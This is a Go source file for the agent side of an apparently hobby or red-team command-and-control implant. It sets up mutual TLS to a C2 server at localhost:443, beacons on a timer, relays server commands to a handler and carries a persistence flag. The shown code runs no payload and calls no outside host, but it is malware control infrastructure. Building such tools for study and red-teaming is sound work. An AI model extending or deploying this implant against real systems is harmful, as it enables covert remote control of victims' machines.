package agent

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"log"
	"time"

	"github.com/joe-broder15/supertrooper/internal/messages"
)

// AgentState holds parameters and configuration for the agent.
type AgentState struct {
	// Certificates for TLS communication.
	caCertPEM    []byte
	agentCertPEM []byte
	agentKeyPEM  []byte

	// TLS configuration for mTLS communication with the server.
	tlsConfig *tls.Config

	// C2 server address to connect to.
	serverAddr string
	// Unique identifier for this agent.
	id string

	// Persistence flag.
	isPersistent bool

	// Maximum number of consecutive communication failures allowed.
	maxMisses int

	// Time intervals for beaconing and keepalive communication with the server (in seconds).
	beaconInterval  int
	keepAlivePeriod int
}

// initTLSConfig creates a new TLS configuration using the provided certificates.
// Exits the process via log.Fatalf if an error occurs.
func initTLSConfig(caCertPEM []byte, agentCertPEM []byte, agentKeyPEM []byte) *tls.Config {
	// Load the agent's certificate and key for client identity.
	agentCert, err := tls.X509KeyPair(agentCertPEM, agentKeyPEM)
	if err != nil {
		log.Fatalf("agent: error loading key pair: %v", err)
	}

	// Create a CA pool with the provided CA certificate to verify the server.
	caCertPool := x509.NewCertPool()
	if ok := caCertPool.AppendCertsFromPEM(caCertPEM); !ok {
		log.Fatal("agent: failed to append CA certificate")
	}

	// Configure mTLS settings for the client.
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{agentCert},
		RootCAs:      caCertPool,
		MinVersion:   tls.VersionTLS12,
	}
	return tlsConfig
}

// newAgentState initializes and returns a new instance of AgentState.
func newAgentState(caCertPEM []byte, agentCertPEM []byte, agentKeyPEM []byte, serverAddr string) *AgentState {
	return &AgentState{
		caCertPEM:       caCertPEM,
		agentCertPEM:    agentCertPEM,
		agentKeyPEM:     agentKeyPEM,
		tlsConfig:       initTLSConfig(caCertPEM, agentCertPEM, agentKeyPEM),
		serverAddr:      serverAddr,
		id:              "none",
		isPersistent:    false,
		maxMisses:       3,
		beaconInterval:  10,
		keepAlivePeriod: 10,
	}
}

// connectToC2 opens a TLS connection to the given C2 server.
func connectToC2(agentState *AgentState) (*tls.Conn, error) {
	conn, err := tls.Dial("tcp", agentState.serverAddr, agentState.tlsConfig)
	if err != nil {
		return nil, fmt.Errorf("agent: error dialing server: %w", err)
	}
	return conn, nil
}

// communicateWithServer connects to the server, sends a hello message,
// processes incoming messages in a keepalive loop, and finally sends a goodbye message.
func communicateWithServer(agentState *AgentState) error {
	// Connect to the C2 server.
	conn, err := connectToC2(agentState)
	if err != nil {
		return err
	}
	defer conn.Close()

	log.Println("agent: connected to server")

	encoder := json.NewEncoder(conn)
	decoder := json.NewDecoder(conn)

	// Send hello message to initiate communication.
	helloMsg := messages.BuildHelloMessage(agentState.id, true, true, agentState.beaconInterval, agentState.maxMisses)
	if err := encoder.Encode(helloMsg); err != nil {
		return fmt.Errorf("agent: error sending hello message: %w", err)
	}

	log.Println("agent: hello message sent")
	log.Println("agent: waiting for server messages")

	// Maintain a keepalive loop for the specified period.
	keepAliveDeadline := time.Now().Add(time.Duration(agentState.keepAlivePeriod) * time.Second)
	for time.Now().Before(keepAliveDeadline) {

		// Set a read timeout (e.g., 5 seconds)
		readTimeout := 1 * time.Second
		conn.SetReadDeadline(time.Now().Add(readTimeout))

		// Receive a response from the server.
		var response messages.C2MessageBase
		if err := decoder.Decode(&response); err != nil {
			continue
		}

		// Optional: Clear the deadline after a successful read.
		conn.SetReadDeadline(time.Time{})

		log.Println("agent: received server message")

		// Process the received C2 message.
		processedResponse, err := processC2Messages(agentState, response)
		if err != nil {
			return fmt.Errorf("agent: error processing C2 message: %w", err)
		}

		log.Println("agent: processed server message")

		// Send the processed response back to the server.
		if err := encoder.Encode(processedResponse); err != nil {
			return fmt.Errorf("agent: error sending processed message: %w", err)
		}

		log.Println("agent: processed message sent")
	}

	// Send goodbye message before closing the connection.
	goodbyeMsg := messages.BuildGoodbyeMessage("none", agentState.beaconInterval)
	if err := encoder.Encode(goodbyeMsg); err != nil {
		return fmt.Errorf("agent: error sending goodbye message: %w", err)
	}

	log.Println("agent: goodbye message sent")

	return nil
}

// Start is the entry point for the agent. It initializes the state and
// enters a loop to repeatedly beacon the server.
func Start(caCertPEM []byte, agentCertPEM []byte, agentKeyPEM []byte) {
	fmt.Println("starting agent as mTLS client using raw TLS sockets")

	agentState := newAgentState(caCertPEM, agentCertPEM, agentKeyPEM, "localhost:443")

	// beacon every beaconInterval seconds until maxMisses is reached
	for missedBeacons := 0; missedBeacons < agentState.maxMisses; missedBeacons++ {
		log.Println("agent: beaconing to server")
		if err := communicateWithServer(agentState); err != nil {
			log.Println("agent: error communicating with server: ", err)
			missedBeacons++
		} else {
			missedBeacons = 0
		}
		log.Println("agent: sleeping for ", agentState.beaconInterval, " seconds")
		time.Sleep(time.Duration(agentState.beaconInterval) * time.Second)
	}
}
